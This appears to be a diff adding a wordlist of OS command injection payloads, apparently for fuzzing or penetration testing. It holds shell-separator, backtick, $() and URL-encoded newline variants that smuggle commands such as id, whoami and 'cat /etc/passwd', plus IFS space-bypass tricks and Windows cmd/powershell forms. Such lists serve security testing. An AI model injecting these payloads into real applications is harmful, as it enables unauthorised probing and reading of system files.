@@ -1,0 +1,36 @@
+;id
+;id;
+|id
+||id
+`id`
+$(id)
+$((id))
+&id
+&&id
+;ls
+;cat /etc/passwd
+;whoami
+|whoami
+`whoami`
+$(whoami)
+;id%00
+;id%0a
+;id%0d%0a
+%0a id
+%0d id
+%3b id
+%7c id
+%26 id
+id%0a
+id%0d
+id%00
+\nid
+\rid
+id;
+id|
+id&
+cmd /c whoami
+powershell whoami
+{id}
+$(IFS)id
+$IFS$9id
